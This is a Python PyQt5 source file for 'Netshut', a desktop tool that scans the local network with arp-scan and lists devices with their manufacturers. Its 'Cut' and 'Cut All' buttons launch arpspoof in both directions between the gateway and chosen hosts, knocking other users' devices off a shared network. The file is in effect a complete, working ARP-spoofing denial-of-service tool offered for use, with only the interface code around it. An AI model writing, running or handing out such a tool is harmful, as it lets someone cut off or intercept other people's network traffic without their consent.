#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from collections import OrderedDict
import os
import re
import shutil
import subprocess
import sys
import json

from PyQt5 import QtNetwork
from PyQt5.QtCore import QThread, pyqtSignal, QSettings, Qt
from PyQt5.QtGui import QIcon
from PyQt5.QtWidgets import QApplication, QMessageBox, QAbstractItemView, QTableWidgetItem, QPushButton, qApp, \
    QMainWindow, QInputDialog, QDesktopWidget, QActionGroup

from about import AboutDialog
from ui.main_ui import Ui_MainWindow

TABLE_COLUMN_COUNT = 5
R_IP, R_MAC, R_MAC_MAN, R_NAME, R_STATUS = range(TABLE_COLUMN_COUNT)

VERSION = 0.1
TITLE = "Netshut {}".format(VERSION)

CMD_ARPSPOOF = shutil.which("arpspoof")
CMD_ARPSCAN = shutil.which("arp-scan")


class CommandThread(QThread):
    results = pyqtSignal(object, object)

    def __init__(self, cmd, parent=None):
        super().__init__(parent)
        self.cmd = cmd

    def run(self):
        (s_code, s_out) = subprocess.getstatusoutput(self.cmd)
        self.results.emit(s_code, s_out)


class MainWidget(QMainWindow):
    def __init__(self):
        super(MainWidget, self).__init__()
        self.settings = QSettings("IK", "Netshut")
        self.th = None
        self.ui = Ui_MainWindow()
        self.ui.setupUi(self)
        self.init_ui()
        self.center()

        # Compile Re's
        self._pat_arp = re.compile("^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+(\S+)", re.MULTILINE)
        self._pat_gip = re.compile("inet\s(.+)/")

        self._cut_hosts = {}
        self._hosts = {}
        self._hosts_names = {}
        self._gw = self.get_gateway()
        self._gw_mac = ""
        self._iface = "wlp2s0"
        self._mac = ""
        self._ip = self.get_ip()

        self.prompt_iface()

        self.ui.lbl_gw.setText("<b>{}</b>".format(self._gw))
        self.ui.lbl_mac.setText("<b>{}</b>".format(self._mac))
        self.ui.lbl_ip.setText("<b>{}</b>".format(self._ip))
        self.ui.lbl_iface.setText("<b>{}</b>".format(self._iface))

        self.cut_all = False

        self.open_config_file()
        self.ui.act_scan.trigger()

    def open_config_file(self):
        if os.path.exists("config"):
            f = open("config")
            self._hosts_names = json.load(f)
            f.close()

    def closeEvent(self, event):
        f = open("config", mode="w")
        json.dump(self._hosts_names, f)
        f.close()
        event.accept()

    def init_ui(self):
        self.setWindowTitle(TITLE)
        self.setWindowIcon(QIcon("img/icon.png"))
        self.ui.action_Help.setIcon(QIcon("img/help-circle.png"))
        self.ui.action_About.triggered.connect(self.act_about_triggered)
        self.ui.act_scan.triggered.connect(self.act_scan_triggered)
        self.ui.act_scan.setIcon(QIcon("img/scan.png"))
        self.ui.act_cut.setIcon(QIcon("img/cut_all.png"))
        self.ui.act_cut.triggered.connect(self.act_cutall_triggered)
        self.ui.tbl_hosts.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.ui.tbl_hosts.verticalHeader().setVisible(False)
        self.ui.tbl_hosts.setColumnCount(TABLE_COLUMN_COUNT)
        self.ui.tbl_hosts.setHorizontalHeaderLabels(
            ["IP Address", "MAC Address", "Device Manufacturer", "Custom Name", "Status"])
        self.ui.tbl_hosts.setColumnWidth(0, 100)
        self.ui.tbl_hosts.setColumnWidth(1, 100)
        self.ui.tbl_hosts.setColumnWidth(2, 240)
        self.ui.tbl_hosts.setColumnWidth(3, 100)
        self.ui.tbl_hosts.setShowGrid(False)
        self.ui.tbl_hosts.itemChanged.connect(self.hosts_item_changed)

        self.ui.actionShow_Icons_Text.setData(Qt.ToolButtonTextUnderIcon)
        self.ui.actionShow_Icons.setData(Qt.ToolButtonIconOnly)

        self.ui.actionCustom_Name.setData(R_NAME)
        self.ui.actionIP_Address.setData(R_IP)
        self.ui.actionMAC_Address.setData(R_MAC)
        self.ui.actionDevice_Manifacturer.setData(R_MAC_MAN)

        self.ui.actionCustom_Name.setChecked(self.settings.value("tbl_show_{}".format(R_NAME), 1, type=int))
        self.ui.actionIP_Address.setChecked(self.settings.value("tbl_show_{}".format(R_IP), 1, type=int))
        self.ui.actionMAC_Address.setChecked(self.settings.value("tbl_show_{}".format(R_MAC), 1, type=int))
        self.ui.actionDevice_Manifacturer.setChecked(self.settings.value("tbl_show_{}".format(R_MAC_MAN), 1, type=int))

        group = QActionGroup(self)
        group.addAction(self.ui.actionShow_Icons)
        group.addAction(self.ui.actionShow_Icons_Text)
        group.triggered.connect(self.act_toolbar_show)

        group2 = QActionGroup(self)
        group2.setExclusive(False)
        group2.addAction(self.ui.actionCustom_Name)
        group2.addAction(self.ui.actionIP_Address)
        group2.addAction(self.ui.actionMAC_Address)
        group2.addAction(self.ui.actionDevice_Manifacturer)
        group2.triggered.connect(self.act_setting_show)

        for a in group2.actions():
            if a.isChecked():
                self.ui.tbl_hosts.showColumn(a.data())
            else:
                self.ui.tbl_hosts.hideColumn(a.data())

        if int(self.settings.value("toolbar_show", Qt.ToolButtonIconOnly)) == Qt.ToolButtonIconOnly:
            self.ui.actionShow_Icons.setChecked(True)
            self.ui.toolBar.setToolButtonStyle(Qt.ToolButtonIconOnly)

        else:
            self.ui.actionShow_Icons_Text.setChecked(True)
            self.ui.toolBar.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)

    def hosts_item_changed(self, item):
        if item.column() == R_NAME and not item.text() == "Not Set":
            self._hosts_names[self.ui.tbl_hosts.item(item.row(), R_MAC).text()] = item.text()

    def act_setting_show(self, action):
        a = "tbl_show_{}".format(action.data())
        self.settings.setValue(a, int(action.isChecked()))
        if action.isChecked():
            self.ui.tbl_hosts.showColumn(action.data())
        else:
            self.ui.tbl_hosts.hideColumn(action.data())

    def act_toolbar_show(self, action):
        self.settings.setValue("toolbar_show", action.data())
        self.ui.toolBar.setToolButtonStyle(action.data())

    def act_cutall_triggered(self):
        if self.cut_all:
            # Resume all hosts
            self.resume_all_hosts()

            self.cut_all = False
            self.ui.act_cut.setIcon(QIcon("img/cut_all.png"))
            self.ui.act_cut.setText("Cut All")
        else:
            # Cut all hosts
            self.cut_all_hosts()

            self.cut_all = True
            self.ui.act_cut.setIcon(QIcon("img/uncut_all.png"))
            self.ui.act_cut.setText("Resume All")

    def resume_all_hosts(self):
        for i, host_ip in enumerate(self._hosts):
            if host_ip in self._cut_hosts:
                btn = self.ui.tbl_hosts.cellWidget(i,R_STATUS)
                btn.setFocus()
                btn.click()

    def cut_all_hosts(self):
        for i, host_ip in enumerate(self._hosts):
            if host_ip not in self._cut_hosts:
                btn = self.ui.tbl_hosts.cellWidget(i,R_STATUS)
                btn.setFocus()
                btn.click()

    def get_ip(self):
        (s_code, s_out) = subprocess.getstatusoutput("ip addr show {}".format(self._iface))
        try:
            return self._pat_gip.findall(s_out)[0]
        except IndexError:
            return ""

    def prompt_iface(self):
        ifaces_names = []
        ifaces_macs = []
        ifaces = QtNetwork.QNetworkInterface.allInterfaces()
        for i in ifaces:
            ifaces_names.append(str(i.name()))
            ifaces_macs.append(str(i.hardwareAddress()))

        if not self.settings.value("iface") or self.settings.value("iface") not in ifaces_names:
            result, ok = QInputDialog.getItem(self, self.tr("Network Interfaces"), self.tr("Select your Interface:"),
                                              ifaces_names, 0, False)
            if ok:
                self._iface = result
                self._mac = ifaces_macs[ifaces_names.index(result)]
                self.settings.setValue("iface", self._iface)
            else:
                QMessageBox.critical(self, TITLE, "You must select an interface card")
                exit()
        else:
            self._iface = self.settings.value("iface")
            self._mac = ifaces_macs[ifaces_names.index(self._iface)]

    def get_gateway(self):
        (s_code, s_out) = subprocess.getstatusoutput("ip route list")
        try:
            gw_ip = s_out.split("\n")[0].split(" ")[2]
        except IndexError:
            print("COULD NOT GET GATEWAY IP")
            exit()

        return gw_ip

    def populate_model(self):
        self.ui.tbl_hosts.setRowCount(len(self._hosts))
        for i, k in enumerate(self._hosts):
            item = QTableWidgetItem(k)
            item.setFlags(item.flags() & ~Qt.ItemIsEditable)
            self.ui.tbl_hosts.setItem(i, R_IP, item)

            item = QTableWidgetItem(self._hosts[k][0])
            item.setFlags(item.flags() & ~Qt.ItemIsEditable)
            self.ui.tbl_hosts.setItem(i, R_MAC, item)

            item = QTableWidgetItem(self._hosts[k][1])
            item.setFlags(item.flags() & ~Qt.ItemIsEditable)
            self.ui.tbl_hosts.setItem(i, R_MAC_MAN, item)

            self.ui.tbl_hosts.setItem(i, R_NAME, QTableWidgetItem(self._hosts_names.get(self._hosts[k][0], "Not Set")))

            self.btn_cut = QPushButton("")
            self.btn_cut.setCheckable(True)

            if k in self._cut_hosts:
                self.btn_cut.setText("Uncut")
                self.btn_cut.setIcon(QIcon("img/lan-disconnect.png"))
                self.btn_cut.setChecked(True)
            else:
                self.btn_cut.setText("Cut")
                self.btn_cut.setChecked(False)
                self.btn_cut.setIcon(QIcon("img/lan-connect.png"))

            self.btn_cut.clicked.connect(self.btn_cut_clicked)
            self.ui.tbl_hosts.setCellWidget(i, R_STATUS, self.btn_cut)

    def set_device_man(self):
        f = open("/usr/share/nmap/nmap-mac-prefixes")

        for line in f.readlines():
            for i, k in enumerate(self._hosts):
                mac = self._hosts[k][0].replace(":", "").upper()[:6]
                if line.startswith(mac):
                    self._hosts[k][1] = line[7:]
                    break
        f.close()

    def get_device_name(self, mac):
        f = open("/usr/share/nmap/nmap-mac-prefixes")

        for line in f.readlines():
            mac = mac.replace(":", "").upper()[:6]
            if line.startswith(mac):
                f.close()
                return line[7:]
        else:
            f.close()
            return ""

    def act_scan_triggered(self):
        self.ui.tbl_hosts.clearContents()
        self.ui.tbl_hosts.setRowCount(0)
        self.ui.act_scan.setEnabled(False)
        self.ui.statusbar.showMessage("Scanning")
        ct = CommandThread("{} --interface={} {}/24".format(CMD_ARPSCAN, self._iface, self._gw), self)
        ct.results.connect(self.scan_completed)
        ct.start()

    def act_about_triggered(self):
        about_dlg = AboutDialog(self)
        about_dlg.setVersion(VERSION)
        about_dlg.show()

    def scan_completed(self, s_code, s_out):
        if s_code == 0:
            hosts = self._pat_arp.findall(s_out)
            # Get gatway mac address
            hosts = dict(hosts)
            self._gw_mac = hosts[self._gw]
            # Remove gateway from list
            del hosts[self._gw]

            self._hosts = hosts
            self._hosts = OrderedDict({k: [v, "Unknown"] for k, v in self._hosts.items()})
            self.set_device_man()
            self.populate_model()
            self.ui.tbl_hosts.resizeColumnsToContents()
            self.ui.lbl_gw.setText("<b>{} ({})</b>".format(self._gw, self.get_device_name(self._gw_mac)))
            self.ui.lbl_mac.setText("<b>{} ({})</b>".format(self._mac, self.get_device_name(self._mac)))
        else:
            QMessageBox.critical(self, TITLE, s_out)

        self.ui.statusbar.showMessage("Done")
        self.ui.act_scan.setEnabled(True)

    def btn_cut_clicked(self):
        button = qApp.focusWidget()

        # or button = self.sender()
        index = self.ui.tbl_hosts.indexAt(button.pos())

        if index.isValid():
            self.ui.tbl_hosts.selectRow(index.row())
            ip = self.ui.tbl_hosts.item(index.row(), R_IP).text()
            if button.isChecked():
                status = self.cut_host(ip)
                if status:
                    button.setText("&Uncut")
                    button.setIcon(QIcon("img/lan-disconnect.png"))
            else:
                status = self.resume_host(ip)
                if status:
                    button.setText("&Cut")
                    button.setIcon(QIcon("img/lan-connect.png"))

    def cut_host(self, ip):
        po1 = subprocess.Popen([CMD_ARPSPOOF, "-i", self._iface, "-t", self._gw, ip], stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=False)
        po2 = subprocess.Popen([CMD_ARPSPOOF, "-i", self._iface, "-t", ip, self._gw], stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=False)
        self._cut_hosts[ip] = [po1, po2]
        return True

    def resume_host(self, ip):
        if ip in self._cut_hosts.keys():
            for p in self._cut_hosts[ip]:
                p.terminate()
                p.kill()
        del self._cut_hosts[ip]
        return True

    def center(self):
        qr = self.frameGeometry()
        cp = QDesktopWidget().availableGeometry().center()
        qr.moveCenter(cp)
        self.move(qr.topLeft())


def main():
    app = QApplication(sys.argv)

    if os.getuid():
        QMessageBox.critical(None, "Error", "You must be root to run this program")
        print("You must be root to run this program")
        exit(1)

    if not (CMD_ARPSCAN and CMD_ARPSPOOF):
        QMessageBox.critical(None, "Error", "This program requires the following utilities:\narpspoof\narp-scan")
        print("This program requires the following utilities:\narpspoof\narp-scan")
        exit(2)

    w = MainWidget()
    w.show()

    sys.exit(app.exec_())


if __name__ == '__main__':
    main()
